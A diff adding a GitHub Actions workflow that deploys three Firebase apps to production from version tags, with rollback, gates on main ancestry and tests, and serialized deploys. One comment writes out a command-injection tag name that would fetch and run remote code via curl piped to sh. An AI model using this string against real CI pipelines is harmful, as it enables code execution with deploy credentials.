@@ -1,0 +1,271 @@
+name: Release to production
+
+# Production ships on a TAG, not on a merge (issue #353). A push to main used
+# to be a push to production, which meant no way to accumulate coherent,
+# tested changes before releasing and no record of what prod was running.
+#
+# Cut a release:      git tag -a v1.4.0 -m "..." && git push origin v1.4.0
+# Roll back:          Actions -> Release to production -> Run workflow -> v1.3.0
+#
+# All three apps (sit, study, do) release together, from one tag, deliberately:
+# they share a Firebase project, a functions codebase and shared-* packages, so
+# a per-app release would ship half a shared change. See docs/releasing.md.
+on:
+  push:
+    tags:
+      - 'v*'
+  # Rollback path. Re-pushing an existing tag does NOT re-run the push trigger,
+  # so redeploying a known-good release needs its own entry point.
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'Existing tag to deploy (rollback), e.g. v1.3.0'
+        required: true
+        type: string
+
+# Serialize production deploys (2026-08-28 incident): five PRs merged in quick
+# succession each launched a full functions deploy in parallel and the
+# Cloud Functions API returned 429 "Per project mutation requests" quota
+# exceeded, leaving prod one merge behind. One deploy at a time.
+# cancel-in-progress stays FALSE deliberately -- never kill a prod deploy
+# mid-flight.
+#
+# KNOWN EDGE, kept on purpose: GitHub allows only one PENDING run per group and
+# cancels the older one, so if a release is in flight and two more queue, the
+# middle one is dropped -- reported as "cancelled", not "queued". That was
+# harmless when this workflow deployed the branch tip (a coalesced run shipped
+# the same code); it is NOT harmless now that each run carries a distinct tag,
+# and a dropped run could be a rollback. Serializing still beats the 429s, so
+# the mitigation is operational, not structural: check the run actually
+# deployed. Documented in docs/releasing.md.
+concurrency:
+  group: firebase-deploy-prod
+  cancel-in-progress: false
+
+# Least privilege at the WORKFLOW level; only the job that authenticates to
+# Google gets `id-token: write` (round 2). verify_tag checks out and runs git
+# -- giving it a credential-minting token hands the WIF sink to the job that
+# handles the least-trusted input in the whole pipeline.
+permissions:
+  contents: read
+
+jobs:
+  # Gate 1: the tag must point at a commit that is ON main. Without this a tag
+  # pushed from any branch -- or from a feature branch that was never merged --
+  # releases code that main's Tests workflow never saw. `git tag` is a local
+  # operation with no review attached, so this is the only thing standing
+  # between a typo'd checkout and production.
+  verify_tag:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    outputs:
+      sha: ${{ steps.resolve.outputs.sha }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - id: resolve
+        name: Resolve the tag and prove it is on main
+        env:
+          # NEVER interpolate a ref name into the shell source. `${{ }}` is
+          # expanded by the Actions expression engine BEFORE bash parses the
+          # script, so the value becomes code, not an argument. Git ref names
+          # forbid space, `~^:?*[\` and `..` but PERMIT ` $ ; " | & ( ) -- so
+          # `v1.0.0";curl$IFS-s$IFS<host>|sh;#` is a pushable tag matching the
+          # `v*` filter. Pushing a tag is the lowest-trust action that reaches
+          # this workflow, and this job holds `id-token: write` against a WIF
+          # provider that is not ref-scoped, so the sink is the deploy service
+          # account itself -- the gate's own bypass. Via `env:` the value
+          # arrives as data and the quoting below keeps it that way.
+          TAG: ${{ inputs.tag || github.ref_name }}
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          # Constrain the alphabet as well as the quoting: defence in depth, and
+          # it also rejects tags that simply aren't releases.
+          #
+          # bash [[ =~ ]], NOT grep: grep is line-oriented, so `^...$` anchors a
+          # LINE and `v1.0.0\nanything` passes on its first line. Git refs
+          # cannot contain newlines, but inputs.tag is a free-form
+          # workflow_dispatch string that can -- so the line-anchored version
+          # held on the push path and not on the rollback path, which is the
+          # one place this check is the only validation there is.
+          if ! [[ "$TAG" =~ ^v[0-9][A-Za-z0-9._-]*$ ]]; then
+            echo "::error::Refusing to release from an unexpected tag name."
+            exit 1
+          fi
+          if ! git rev-parse -q --verify "refs/tags/$TAG" >/dev/null; then
+            echo "::error::No such tag: $TAG"
+            exit 1
+          fi
+          SHA="$(git rev-list -n 1 "refs/tags/$TAG")"
+          echo "sha=$SHA" >> "$GITHUB_OUTPUT"
+
+          git fetch --no-tags origin main
+          if ! git merge-base --is-ancestor "$SHA" origin/main; then
+            echo "::error::Tag $TAG ($SHA) is not an ancestor of origin/main."
+            echo "::error::Only commits that have landed on main may be released."
+            exit 1
+          fi
+          echo "Releasing $TAG -> $SHA (verified on main)"
+
+  # Gate 2: the same Tests workflow main runs, re-run against the tagged tree.
+  # The commit passed on main, but CI tests the MERGE ref, and a later merge can
+  # break an earlier commit's assumptions; a release is the one place worth
+  # paying for the certainty rather than inferring it.
+  #
+  # NEW releases only. A reusable workflow resolves at the CALLER's ref, and a
+  # workflow_dispatch run resolves at the default branch -- so on the rollback
+  # path this would test main, not the tag being deployed, and report a green
+  # gate for a tree it never looked at. A rollback target is by definition a
+  # tag that already passed this gate when it was released, and blocking an
+  # emergency rollback on a fresh test run would be the wrong trade anyway.
+  verify_tests:
+    needs: verify_tag
+    if: github.event_name == 'push'
+    uses: ./.github/workflows/test.yml
+
+  build_and_deploy:
+    needs: [verify_tag, verify_tests]
+    # `needs` on a SKIPPED job skips the dependent too, which would make every
+    # rollback a no-op that reports success. Require verify_tag to have passed
+    # and verify_tests to have either passed or been deliberately skipped --
+    # never to have failed.
+    # `!cancelled()`, not `always()`: always() is true even when the run has
+    # been cancelled, and on the rollback path verify_tests is skipped by
+    # design -- so once verify_tag had succeeded, cancelling the run would
+    # still let the production deploy proceed.
+    if: >-
+      !cancelled()
+      && needs.verify_tag.result == 'success'
+      && (needs.verify_tests.result == 'success' || needs.verify_tests.result == 'skipped')
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ needs.verify_tag.outputs.sha }}
+
+      - name: Enable pnpm (Corepack)
+        run: |
+          corepack enable
+          corepack prepare pnpm@10.13.1 --activate
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+          cache: pnpm
+
+      - run: pnpm install --frozen-lockfile
+
+      # Build web (Firebase config is public/client-side, not secret)
+      - name: Build web
+        run: pnpm --filter web build
+        env:
+          VITE_FIREBASE_API_KEY: AIzaSyDyYp2GQdH-8h16B6XNx3sdI8tdDcY1tEw
+          VITE_FIREBASE_AUTH_DOMAIN: sync-sit.firebaseapp.com
+          VITE_FIREBASE_PROJECT_ID: sync-sit
+          VITE_FIREBASE_STORAGE_BUCKET: sync-sit.firebasestorage.app
+          VITE_FIREBASE_MESSAGING_SENDER_ID: '652129443234'
+          VITE_FIREBASE_APP_ID: '1:652129443234:web:b1addb8ca9204154aba6fb'
+          VITE_FIREBASE_VAPID_KEY: BHhR2VRnGyiMruB55skkISGURA5MqVat0lzGRtzfnfHJ6IlgOs8sZDKy25k0nitxIlmLToaUWr1YfX5KBuxg1yo
+
+      # Build study-web (second hosting target: site sync-study-app). Same
+      # project-level Firebase config; reuses the sit web-app id for now — a
+      # dedicated app registration for sync-study is a follow-up.
+      - name: Build study-web
+        run: |
+          pnpm --filter @ejm/shared-core build
+          pnpm --filter @ejm/study-core build
+          pnpm --filter study-web build
+        env:
+          VITE_FIREBASE_API_KEY: AIzaSyDyYp2GQdH-8h16B6XNx3sdI8tdDcY1tEw
+          VITE_FIREBASE_AUTH_DOMAIN: sync-sit.firebaseapp.com
+          VITE_FIREBASE_PROJECT_ID: sync-sit
+          VITE_FIREBASE_STORAGE_BUCKET: sync-sit.firebasestorage.app
+          VITE_FIREBASE_MESSAGING_SENDER_ID: '652129443234'
+          VITE_FIREBASE_APP_ID: '1:652129443234:web:b1addb8ca9204154aba6fb'
+          # Same project-wide public VAPID key as the sit build step above —
+          # study-web push (issue #168 Phase 1) needs it at build time.
+          VITE_FIREBASE_VAPID_KEY: BHhR2VRnGyiMruB55skkISGURA5MqVat0lzGRtzfnfHJ6IlgOs8sZDKy25k0nitxIlmLToaUWr1YfX5KBuxg1yo
+
+      # Build do-web (third hosting target: site sync-do-app, plan §3.1). Same
+      # project-level Firebase config; reuses the sit web-app id like study-web
+      # does — a dedicated app registration for sync-do is a follow-up.
+      - name: Build do-web
+        run: |
+          pnpm --filter @ejm/shared-core build
+          pnpm --filter @ejm/do-core build
+          pnpm --filter do-web build
+        env:
+          VITE_FIREBASE_API_KEY: AIzaSyDyYp2GQdH-8h16B6XNx3sdI8tdDcY1tEw
+          VITE_FIREBASE_AUTH_DOMAIN: sync-sit.firebaseapp.com
+          VITE_FIREBASE_PROJECT_ID: sync-sit
+          VITE_FIREBASE_STORAGE_BUCKET: sync-sit.firebasestorage.app
+          VITE_FIREBASE_MESSAGING_SENDER_ID: '652129443234'
+          VITE_FIREBASE_APP_ID: '1:652129443234:web:b1addb8ca9204154aba6fb'
+          # Same project-wide public VAPID key as the sit/study build steps
+          # above — do-web push (sync-do plan §13 PR9, fcmTokensDo) needs it
+          # at build time.
+          VITE_FIREBASE_VAPID_KEY: BHhR2VRnGyiMruB55skkISGURA5MqVat0lzGRtzfnfHJ6IlgOs8sZDKy25k0nitxIlmLToaUWr1YfX5KBuxg1yo
+
+      # Authenticate to Google Cloud via Workload Identity Federation
+      - id: auth
+        uses: google-github-actions/auth@v2
+        with:
+          project_id: sync-sit
+          workload_identity_provider: projects/652129443234/locations/global/workloadIdentityPools/github-pool/providers/github-provider
+          service_account: github-action-1196270164@sync-sit.iam.gserviceaccount.com
+          create_credentials_file: true
+          export_environment_variables: true
+
+      # Deploy Firestore rules + indexes FIRST: new collections' rules must be
+      # live before hosting ships UI that reads them. Historically this step
+      # was missing — hosting+functions auto-deployed on merge while rules and
+      # indexes silently went stale in prod.
+      - name: Deploy Firestore rules and indexes
+        run: pnpm exec firebase deploy --only firestore --project sync-sit --non-interactive
+
+      # Storage rules auto-deploy (issue #282), beside its Firestore sibling
+      # per issue #286: rules ship BEFORE the hosting/functions that depend on
+      # them. This step started life LAST as a hard-fail probe (PR #283 round
+      # 2) because the WIF SA's storage-side grant could not be verified from
+      # CI ahead of the first run -- and that caution was vindicated: the
+      # first runs failed 403 on `firebasestorage.defaultBucket.get`, a
+      # permission `roles/firebaserules.admin` does not carry. The SA now
+      # holds `roles/firebasestorage.admin` (granted 2026-08-28, issue #286),
+      # and main's rules were released by an owner-credential deploy the same
+      # day, so a failure here is a regression, not a first-contact surprise.
+      - name: Deploy Storage rules
+        run: pnpm exec firebase deploy --only storage --project sync-sit --non-interactive
+
+      # Deploy hosting (uses ADC from auth step)
+      - name: Deploy Hosting
+        run: pnpm exec firebase deploy --only hosting --project sync-sit --non-interactive
+
+      # Bundle shared for functions deploy
+      - run: node scripts/bundle-shared-for-deploy.js
+
+      # Build functions
+      - run: cd apps/functions && npx tsc
+
+      # Deploy functions (uses ADC from auth step). One retry after a
+      # 2-minute backoff: the mutation-request quota that failed the
+      # 2026-08-28 run is a short-window rate limit, so a single spaced
+      # retry recovers residual pressure that serialization cannot (e.g. a
+      # manual console deploy running concurrently).
+      - name: Deploy Cloud Functions
+        run: |
+          if ! pnpm exec firebase deploy --only functions --project sync-sit --non-interactive --force; then
+            echo "functions deploy failed -- backing off 120s and retrying once"
+            sleep 120
+            pnpm exec firebase deploy --only functions --project sync-sit --non-interactive --force
+          fi
+
+      # Unbundle shared
+      - run: node scripts/unbundle-shared-after-deploy.js
